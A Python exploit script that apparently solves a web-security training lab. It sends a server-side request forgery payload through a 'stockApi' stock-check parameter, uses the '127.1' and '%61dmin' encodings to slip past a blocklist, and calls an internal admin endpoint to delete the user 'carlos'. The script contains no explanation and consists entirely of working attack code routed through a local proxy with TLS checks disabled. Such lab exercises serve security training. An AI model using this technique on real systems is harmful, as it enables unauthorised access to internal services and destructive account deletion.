import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxie={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}

def delete_user(url):
    delete_user_url_ssrf_payloa="http://127.1/%61dmin/delete?username=carlos"
    check_stock_path="product/stock"
    param={"stockApi":delete_user_url_ssrf_payloa}
    r=requests.post(url+check_stock_path,data=param,verify=False,proxies=proxie)

      # Check if user was deleted
    params2 = {'stockApi': 'http://127.1/%61dmin/'}
    r = requests.post(url + check_stock_path, data=params2, verify=False, proxies=proxie)
    if 'User deleted successfully' in r.text:
        print("(+) Successfully deleted Carlos user!")
    else:
        print("(-) Exploit was not successful.")

def main():
    if len(sys.argv) !=2:
        print(" (+) usage %s <url>" % sys.argv[0])
        print(" (+) example %s www.examlpe.ma" % sys.argv[0])
        sys.exit(-1)

    url=sys.argv[1]
    print("deleting user ..........")
    delete_user(url)





if __name__ == "__main__":
    main()